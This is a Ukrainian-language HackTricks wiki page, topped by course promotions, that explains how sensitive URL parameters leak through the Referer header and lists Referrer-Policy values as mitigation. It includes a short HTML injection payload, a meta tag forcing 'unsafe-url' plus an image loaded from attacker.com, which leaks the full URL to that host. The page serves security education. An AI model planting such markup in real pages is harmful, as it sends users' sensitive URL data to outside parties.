{% hint style="success" %}
Вивчайте та практикуйте взлом AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

# Заголовки реферерів та політика

Реферер - це заголовок, який використовується браузерами для вказівки на те, яка була попередня відвідана сторінка.

## Витік чутливої інформації

Якщо на веб-сторінці в якийсь момент розташована будь-яка чутлива інформація в параметрах запиту GET, якщо сторінка містить посилання на зовнішні джерела або зловмисник може змусити/запропонувати (соціальний інжиніринг) користувачеві відвідати URL, керований зловмисником. Це може дозволити витягти чутливу інформацію в останньому запиті GET.

## Пом'якшення

Ви можете змусити браузер дотримуватися **політики реферера**, яка може **запобігти** відправці чутливої інформації іншим веб-додаткам:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Протидія-заходи

Ви можете перевизначити це правило, використовуючи HTML мета-тег (зловмисник повинен використовувати HTML ін'єкцію):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Захист

Ніколи не вставляйте жодних чутливих даних у параметри GET або шляхи в URL-адресі.
